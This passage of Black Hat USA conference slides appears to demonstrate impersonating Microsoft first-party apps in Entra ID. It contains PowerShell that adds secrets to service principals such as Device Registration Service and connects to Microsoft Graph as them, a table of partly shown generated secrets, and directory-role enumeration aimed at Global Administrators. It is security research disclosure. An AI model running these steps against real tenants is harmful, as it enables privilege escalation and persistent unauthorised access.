Service Principal App Registration Device Registration Service Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions Application Permissions _User.ReadWrite.All User.ReadWrite.All Directory.ReadWrite.All Directory.ReadWrite.All Group.Read.All Group.Read.All_ Credential Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 60

## Impersonating Microsoft applications

Customer Tenant Impersonating Application ~~Access Token~~

Client ID Service Principal Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 Application Permissions Access Token _User.ReadWrite.All Directory.ReadWrite.All_ (AuthZ) _Group.Read.All_ Customer Tenant Credential

Microsoft Tenant

App Registration Device Registration Service 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions _User.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Credential

Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 61

## Impersonating Microsoft applications

Customer Tenant Impersonating Application Microsoft Tenant
Access Token
Client ID
Service Principal App Registration
Device Registration Service Device Registration Service
7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Application Permissions Access Token Application Permissions
User.ReadWrite.All User.ReadWrite.All
Directory.ReadWrite.All Directory.ReadWrite.All
(AuthZ)
Group.Read.All Group.Read.All
Customer Tenant
Credential Credential
Stuff

#### Microsoft Graph API

#BHUSA @BlackHatEvents

## Slide 62

## Impersonating Microsoft applications

Customer Tenant Impersonating Application Microsoft Tenant

Client ID OAuth 2.0 client credential grant flow Service Principal App Registration <u>(CCGF)</u> Device Registration Service Device Registration Service 7e4e13f8-c0d3-4e27-bc71-f7ab67b3b686 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Application Permissions Application Permissions _User.ReadWrite.All_ Access Token _User.ReadWrite.All Directory.ReadWrite.All Directory.ReadWrite.All Group.Read.All_ Customer Tenant _Group.Read.All_ Credential Credential Stuff

#BHUSA @BlackHatEvents

Microsoft Graph API

## Slide 63

## OAuth 2.0 Client Credential Grant Flow

1. Application requests an access token from Entra ID with the client ID and secret

2. Entra ID returns an access token

3. Application calls Microsoft Graph with the access token

Entra ID Microsoft Graph
1
2
3 4
5

Application

4. Microsoft Graph validates the access token

5. Microsoft Graph returns the requested data

#BHUSA @BlackHatEvents

## Slide 64

## OAuth 2.0 Client Credential Grant Flow

- In a client credential grant flow, the .default scope is the only scope permitted by Microsoft Graph

- .default scope is the application permissions defined in the app registration

Application Entra ID Microsoft Graph
1
2
3 4
5

- .default scope does not indicate additional permissions provided by other authorization systems

#BHUSA @BlackHatEvents

## Slide 65

## Looking for applications to impersonate

\```
$spn= Get-AzureADServicePrincipal-All $true| Where-Object{$_.AppOwnerTenantId-like
"f8cdef31-a31e-4b4a-93e4-5f571e91255a"}
\```

\```
$spn| Foreach-Object{
\```

\```
$cred= $null
\```

\```
$cred= New-AzureADServicePrincipalPasswordCredential-ObjectId$CurrentSPN.ObjectId
-EndDate$notafter
\```

\```
$output= $_.DisplayName+ ","+ $_.ObjectId+ ","+ $_.AppId+ ","+ $cred.Value
$output| Out-FileC:\temp\serviceprincipals.csv -Append
\```

\```
}
\```

#BHUSA @BlackHatEvents

## Slide 66

## Looking for applications to impersonate

\```
$spn= Get-AzureADServicePrincipal-All $true| Where-Object{$_.AppOwnerTenantId-like
"f8cdef31-a31e-4b4a-93e4-5f571e91255a"}
\```

\```
$spn| Foreach-Object{
\```

\```
$cred= $null
\```

\```
$cred= New-AzureADServicePrincipalPasswordCredential-ObjectId$CurrentSPN.ObjectId
-EndDate$notafter
\```

\```
$output= $_.DisplayName+ ","+ $_.ObjectId+ ","+ $_.AppId+ ","+ $cred.Value
$output| Out-FileC:\temp\serviceprincipals.csv -Append
\```

\```
}
\```

Microsoft tenant ID

#BHUSA @BlackHatEvents

## Slide 67

## Looking for applications to impersonate

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Looking for applications to impersonate

1	Name	OID	AppID	PW
2	ChatMigrationService1P	006daeab-5acd-481f-a9ba-9bb5913f9b72	3af5adde-460d-4bc1-ada0-fc648af8fefb	FhMiJnIsdCIdUnoGRfUPt7dUPwc1ltYtZmVwMC…
3	Microsoft Threat Protection	00aee614-ac22-4ebe-9a13-d77ea09fdd20	8ee8fdad-f234-4243-8f3b-15c294843740	aYF/h4VhzJhP984bu1dXH4LGNVs+VC8bfqTnVI…
4	Compute Artifacts Publishing Service	00bc92d9-dff3-4421-ab84-d2158fded358	a8b6bf88-1d1a-4626-b040-9a729ea93c65	V0Vis4ndoAPKIAFBWRYLgXMAgphafM2O78uIW…
5	Recommended	00fb2610-2358-47c7-805d-d9bd849aa0df	98c8388a-4e86-424f-a176-d1288462816f	mpNiY4kFxLJZs+0cOqlpZBBgBVaLrV41dG1pkt9…
6	asmcontainerimagescanner	0136d09b-bf2a-47f3-9f7a-41652c89d1d4	918d0db8-4a38-4938-93c1-9313bdfe0272	G7k5NvxoMhr9NOIfkY+F6VjNRIgplTp7OgUmGI…
7	Azure Credential Configuration Endpoint Service	01c690a3-1de3-443e-93c5-95b314d77e17	ea890292-c8c8-4433-b5ea-b09d0668e1a6	CicmT1ZDDVM3OhSxhjdblNqLnVUiUyx5TMWS…
8	Power Platform Governance Services - TIRPS	0269af19-8365-4731-95f3-4dada2c31565	2b5e68f0-bdc2-45b0-920a-217d5cbbd505	CEGlvrmGS/0mhLDPV8hoOwRzrrejvABAIXET2X…
9	Azure Compute	028984c9-e708-4641-8fc9-5fae91350a12	579d9c9d-4c83-4efc-8124-7eba65ed3356	ZGM8fLlvjP3zZeKTeTlQH1kDhMlx1pyajCTsEixP…
10	CAS API Security RP Dev	02ed60b6-20db-4a05-bf2e-086deb7e8f62	cb250467-fc8f-4c42-8349-9ff9e9a17b02	et7xe5wUI05N0CoZusFqS8b566Fa11oBHhIsqF…
11	Microsoft Teams Partner Tenant Administration	03b8d2ac-ea42-4209-9b68-463a712ef09a	0c708d37-30b2-4f22-8168-5d0cba6f37be	snOXtYKhk/AtYnEypqTbaX4xfk2cr4TwUhb2+Mv…
12	Azure Storage Insights Resource Provider	04e976b6-0d37-4d25-989c-f32f0f607049	b15f3d14-f6d1-4c0d-93da-d4136c97f006	SQLr/7DQjN4dCd2acrIse5Qkb0LFX3qDbsj0OS…
13	IDML Graph Resolver Service and CAD	06a0b864-182f-4dfb-b767-b97b906ba9fa	d88a361a-d488-4271-a13f-a83df7dd99c2	ng/lGBRIFpU8Du8fmiAYskVwUNs6UFuvpqYiHk…
14	Diagnostic Services Trusted Storage Access	072bf89d-e915-49a0-95dc-d4bd0a400add	562db366-1b96-45d2-aa4a-f2148cef2240	vrJGDmbCpjePQ848gbP2lZhZM/Vs+4jkwyTAck…
15	Microsoft Dynamics CRM Learning Path	0752dc69-9422-49b5-ad82-dd2a1029560b	2db8cb1d-fb6c-450b-ab09-49b6ae35186b	SWTvLOMqcT9P3pQ4CKaLM5hfwoKuHAFPOU…
16	OfficeClientService	087c54ed-9c68-4d9b-8d4d-44e4bcf64c09	0f698dd4-f011-4d23-a33e-b36416dcb1e6	wsw1OeOQzxiWqAhEqhXsrma+/bwWXWjTvNp…
566	Graph Connector Service	fbbaf13e-e2f3-479b-9b0c-e59e70e9db5b	56c1da01-2129-48f7-9355-af6d59d42766	jQCPM3EIWJwAM+CbmqcwtdM3MF0ovZmHa6…
567	Export to data lake	fc28cd59-096a-4a9f-bce6-2c78f9fdd232	7f15f9d9-cad0-44f1-bbba-d36650e07765	QCV4qQ6SxJlKYxnhjM+z6MN//pbpt4uN9EP0Sg…
568	Networking-MNC	fc42d9fe-e142-4ac5-9b87-8d90c173b021	6d057c82-a784-47ae-8d12-ca7b38cf06b4	38E1dpj+XlxnIaGyt/+TwomseYpkxJro65+8wsi6…
569	Cloud Infrastructure Entitlement Management	fc897223-f34c-443b-9cd6-b557ce5c3dc9	b46c3ac5-9da6-418f-a849-0a07a10b3c6c	U21e5uVKrlkk7DRxnXMq7AVTJNwmYbTlfY//ED…
570	Azure Guest Container Update Manager	fe3507b5-a34c-4c9b-8d32-a8fc1a6190b4	c8f5141d-83e0-4e9a-84d0-bb6677e26f64	ZxDVULTnXG+zg55i60yAYBKqYMLc/g1nHrQszb…
571	Azure AD Notification	fea4cfba-323d-4ab2-b039-1a41348c8c2a	fc03f97a-9db0-4627-a216-ec98ce54e018	HJNHy3gepnUMsHCUNa7cRwpWg4SGbw/Cw7…
572	Azure Bastion	fedefbbf-3cf4-449f-8bc4-97ff8f6bf184	79d7fb34-4bef-4417-8184-ff713af7a679	rxEqS+xzRiqkdP8iixCeAymMvJYzlukDbtLDDZRn…
573	Customer Experience Platform CDPA Provisioning TIP	ff5a6c80-78b9-49c2-9e8f-3fd21f3a13d8	f5223e1a-4d50-4fda-9049-55d819fbb03e	8zwGnq5qVMkiBkFrMBO88uy6GReMqhx+FHTz…
574	Azure Cost Management XCloud	ffdad0a0-a2ac-47e5-b26e-757b835beac2	3184af01-7a88-49e0-8b55-8ecdce0aa950	2sr0paXs1v4/aZJy/C5jlH5orm/WGDHYQE6eP0…

[Column D (PW) values run off the right edge of the visible table and are truncated in the slide, indicated by the trailing … above.]
```

## Slide 68

## Looking for applications to impersonate

\```
$spn| ForEach-Object{
\```

\```
$cred= New-Object-TypeName System.Management.Automation.PSCredential-ArgumentList
$_.AppId,(ConvertTo-SecureString-AsPlainText$_.PW-Force)
\```

\```
Connect-MgGraph-TenantID11ae06df-xxxx-4b9e-bf66-2a91f4955339
-ClientSecretCredential$cred
\```

\```
Get-MgContext| Out-FileC:\temp\ccgfauthworks.txt –Append
Disconnect-MgGraph-ErrorActionSilentlyContinue
\```

\```
}
\```

#BHUSA @BlackHatEvents

## Slide 69

## Looking for applications to impersonate

\```
$spn| ForEach-Object{
\```

\```
$cred= New-Object-TypeName System.Management.Automation.PSCredential-ArgumentList
$_.AppId,(ConvertTo-SecureString-AsPlainText$_.PW-Force)
\```

\```
Connect-MgGraph-TenantID11ae06df-xxxx-4b9e-bf66-2a91f4955339
-ClientSecretCredential$cred
\```

\```
Get-MgContext| Out-FileC:\temp\ccgfauthworks.txt –Append
Disconnect-MgGraph-ErrorActionSilentlyContinue
\```

\```
}
\```

Customer (target) tenant ID

#BHUSA @BlackHatEvents

## Slide 70

## Looking for applications to impersonate

\```
$spn| ForEach-Object{
\```

\```
$cred= New-Object-TypeName System.Management.Automation.PSCredential-ArgumentList
$_.AppId,(ConvertTo-SecureString-AsPlainText$_.PW-Force)
\```

\```
Connect-MgGraph-TenantID11ae06df-xxxx-4b9e-bf66-2a91f4955339
-ClientSecretCredential$cred
\```

\```
Get-MgContext| Out-FileC:\temp\ccgfauthworks.txt –Append
Disconnect-MgGraph-ErrorActionSilentlyContinue
\```

\```
}
\```

Gather current session details, including scopes (permissions)

#BHUSA @BlackHatEvents

## Slide 71

## Applications that support OAuth 2.0 CCGF

- Office 365 Exchange Online

- Office 365 SharePoint Online

- Dataverse

- Viva Engage (Yammer)

- Microsoft Rights Management Services

- Azure Multi-Factor Auth Client

- Skype for Business Online

- AADPasswordProtectionProxy

- Device Registration Service

#BHUSA @BlackHatEvents

## Slide 72

## Looking for the “write” scopes

- **Office 365 Exchange Online** – Group.ReadWrite.All, Domain.ReadWrite.All

- **Office 365 SharePoint Online** – Application.ReadWrite.OwnedBy

- **Dataverse** – OnlineMeetings.ReadWrite.All

- **Viva Engage (Yammer)** – Group.Create, Files.ReadWrite.All

- **Microsoft Rights Management Services** – No write scopes

- **Azure Multi-Factor Auth Client** – No scopes

- **Skype for Business Online** – No scopes

- **AADPasswordProtectionProxy** – No scopes

- **Device Registration Service** – No scopes

#BHUSA @BlackHatEvents

## Slide 73

## Let’s try privileged things anyway

#BHUSA @BlackHatEvents

## Slide 74

## The tests

- Disable a regular / privileged user

- Change a users / privileged users password

- Manage role assignments

- Create a user

- Delete a user / privileged user

- Permanently delete a privileged user

- Create a group eligible for role assignment

- Create an Administrative Unit

- Manage role assigned group membership

#BHUSA @BlackHatEvents

## Slide 75

# The results

#BHUSA @BlackHatEvents

## Slide 76

## Application Administrator Role

Entra ID
Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 77

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 78

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 79

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 80

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator Application Administrator Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 81

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 82

## Owning Global Administrator

Device Registration Service

Entra ID

Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 83

## Owning Global Administrator

Device Registration Service
Entra ID
Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 84

## Owning Global Administrator

Device Registration Service
Entra ID
Global Administrator
Application Administrator
Cloud Application Administrator

#BHUSA @BlackHatEvents

## Slide 85

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...

PS C:\temp> $notafter = (Get-Date).AddMonths(6)
PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
PS C:\temp> $TargetSPN

ObjectId                             AppId                                DisplayName
--------                             -----                                -----------
c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service

PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
PS C:\temp> $SPNCreds.Value
FcGhiy7mY[obscured]
PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
PS C:\temp> Disconnect-AzureAD
PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
Welcome to Microsoft Graph!

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp>
```

## Slide 86

**#BHUSA @BlackHatEvents** Getting the Device Registration Service service principal


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...

PS C:\temp> $notafter = (Get-Date).AddMonths(6)
PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
PS C:\temp> $TargetSPN

ObjectId                             AppId                                DisplayName
--------                             -----                                -----------
c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service

PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
PS C:\temp> $SPNCreds.Value
FcGhiy7mY[obscured]
PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
PS C:\temp> Disconnect-AzureAD
PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
Welcome to Microsoft Graph!

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp>

[red highlight box around the line: $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"]

Caption: Getting the Device Registration Service service principal
```

## Slide 87

**#BHUSA @BlackHatEvents** Adding a new secret (password) credential to the service principal


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...

PS C:\temp> $notafter = (Get-Date).AddMonths(6)
PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
PS C:\temp> $TargetSPN

ObjectId                             AppId                                DisplayName
--------                             -----                                -----------
c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service

PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
PS C:\temp> $SPNCreds.Value
FcGhiy7mY[obscured]
PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
PS C:\temp> Disconnect-AzureAD
PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
Welcome to Microsoft Graph!

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp>

[red highlight box around the line: $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter]

Caption: Adding a new secret (password) credential to the service principal
```

## Slide 88

**#BHUSA @BlackHatEvents** Stuffing creds into a credential object


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...

PS C:\temp> $notafter = (Get-Date).AddMonths(6)
PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
PS C:\temp> $TargetSPN

ObjectId                             AppId                                DisplayName
--------                             -----                                -----------
c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service

PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
PS C:\temp> $SPNCreds.Value
FcGhiy7mY[obscured]
PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
PS C:\temp> Disconnect-AzureAD
PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
Welcome to Microsoft Graph!

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp>

[red highlight box around the line: $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW]

Caption: Stuffing creds into a credential object
```

## Slide 89

**#BHUSA @BlackHatEvents** Connecting to Microsoft Graph with the customer (target) tenant ID and credentials


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

ga-eric@northwindtradersglobal.onmicrosoft.com AzureCloud   a8c79a2a-f998-4913-96d2-f45694b77be1 northwindtradersglob...

PS C:\temp> $notafter = (Get-Date).AddMonths(6)
PS C:\temp> $TargetSPN = Get-AzureADServicePrincipal -SearchString "Device Registration Service"
PS C:\temp> $TargetSPN

ObjectId                             AppId                                DisplayName
--------                             -----                                -----------
c344e5a6-111d-4a00-a8e3-d1beb87c0750 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 Device Registration Service

PS C:\temp> $SPNCreds = New-AzureADServicePrincipalPasswordCredential -ObjectId $TargetSPN.ObjectId -EndDate $notafter
PS C:\temp> $SPNCreds.Value
FcGhiy7mY[obscured]
PS C:\temp> $SPNPW = ConvertTo-SecureString -AsPlainText $SPNCreds.Value -Force
PS C:\temp> $GraphCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $TargetSPN.AppId, $SPNPW
PS C:\temp> Disconnect-AzureAD
PS C:\temp> Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds
Welcome to Microsoft Graph!

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp>

[red highlight box around the line: Connect-MgGraph -TenantId a8c79a2a-f998-4913-96d2-f45694b77be1 -ClientSecretCredential $GraphCreds]

Caption: Connecting to Microsoft Graph with the customer (target) tenant ID and credentials
```

## Slide 90

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp> Get-MgContext

ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
Scopes                    :
AuthType                  : AppOnly
TokenCredentialType       : ClientSecret
CertificateThumbprint     :
CertificateSubjectName    :
Account                   :
AppName                   : Device Registration Service
ContextScope              : Process
Certificate               :
PSHostVersion             : 5.1.22621.2506
ManagedIdentityId         :
ClientSecret              : System.Security.SecureString
Environment               : Global

PS C:\temp>
```

## Slide 91

**#BHUSA @BlackHatEvents** Gathering our Microsoft Graph session details


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp> Get-MgContext

ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
Scopes                    :
AuthType                  : AppOnly
TokenCredentialType       : ClientSecret
CertificateThumbprint     :
CertificateSubjectName    :
Account                   :
AppName                   : Device Registration Service
ContextScope              : Process
Certificate               :
PSHostVersion             : 5.1.22621.2506
ManagedIdentityId         :
ClientSecret              : System.Security.SecureString
Environment               : Global

PS C:\temp>

[red highlight box around the command: Get-MgContext]

Caption: Gathering our Microsoft Graph session details
```

## Slide 92

**#BHUSA @BlackHatEvents** We have a session with credentials for Device Registration Service


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp> Get-MgContext

ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
Scopes                    :
AuthType                  : AppOnly
TokenCredentialType       : ClientSecret
CertificateThumbprint     :
CertificateSubjectName    :
Account                   :
AppName                   : Device Registration Service
ContextScope              : Process
Certificate               :
PSHostVersion             : 5.1.22621.2506
ManagedIdentityId         :
ClientSecret              : System.Security.SecureString
Environment               : Global

PS C:\temp>

[red highlight box around the AppName value: Device Registration Service]

Caption: We have a session with credentials for Device Registration Service
```

## Slide 93

No scopes

There are no OAuth 2.0 scopes (permissions) indicated

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

Connected via apponly access using 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
Readme: https://aka.ms/graph/sdk/powershell
SDK Docs: https://aka.ms/graph/sdk/powershell/docs
API Docs: https://aka.ms/graph/docs

NOTE: You can use the -NoWelcome parameter to suppress this message.

PS C:\temp> Get-MgContext

ClientId                  : 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9
TenantId                  : a8c79a2a-f998-4913-96d2-f45694b77be1
Scopes                    :
AuthType                  : AppOnly
TokenCredentialType       : ClientSecret
CertificateThumbprint     :
CertificateSubjectName    :
Account                   :
AppName                   : Device Registration Service
ContextScope              : Process
Certificate               :
PSHostVersion             : 5.1.22621.2506
ManagedIdentityId         :
ClientSecret              : System.Security.SecureString
Environment               : Global

PS C:\temp>

[red highlight box around the empty Scopes value, with red annotation text 'No scopes' to its right]

Caption: There are no OAuth 2.0 scopes (permissions) indicated
```

## Slide 94

**#BHUSA @BlackHatEvents**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 77/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Windows PowerShell]

PS C:\temp> Get-MgDirectoryRole | Select-Object -Property DisplayName,ID

DisplayName                               Id
-----------                               --
Security Administrator                    128284a5-9a9e-49c3-a460-fd25554f8c45
Global Reader                             2863c272-b286-4077-b65f-6b1a5e72adc4
Azure AD Joined Device Local Administrator 4a2d4dc3-6634-44f2-a5a6-70ddedcfdc86
User Administrator                        77414df4-e2ff-42df-8a7d-58df04e65885
Directory Readers                         96c41d0e-04c8-476d-94df-603263509dc1
Global Administrator                      ae81c4d9-3b45-445b-896a-64aa7085db93
Directory Synchronization Accounts        b077747c-3953-408b-91f2-d6b58fdda0bc
Attribute Definition Administrator        b8508655-1331-4183-95ba-90a39d67e5ae
Application Administrator                 d383ec2f-f9ca-4e36-8230-225832c0c361
Conditional Access Administrator          dbdf8b40-4757-4900-8676-7f2a81c9a294

PS C:\temp> Get-MgDirectoryRoleMember -DirectoryRoleId ae81c4d9-3b45-445b-896a-64aa7085db93 | ForEach-Object { Get-MGUser -UserId $_.Id}

DisplayName        Id                                   Mail                                              UserPrincipalName
-----------        --                                   ----                                              -----------------
Eric Woodruff      d7148226-7444-4884-aef7-b5fe693a6798 ga-eric@northwindtradersglobal.onmicrosoft.com    ga-eric@north...
Eric Woodruff (GA) 737e7448-93c6-4677-b697-244935b1ad80                                                   ga-ericw@nort...

PS C:\temp>
```

## Slide 95

Gathering directory roles

**#BHUSA @BlackHatEvents**


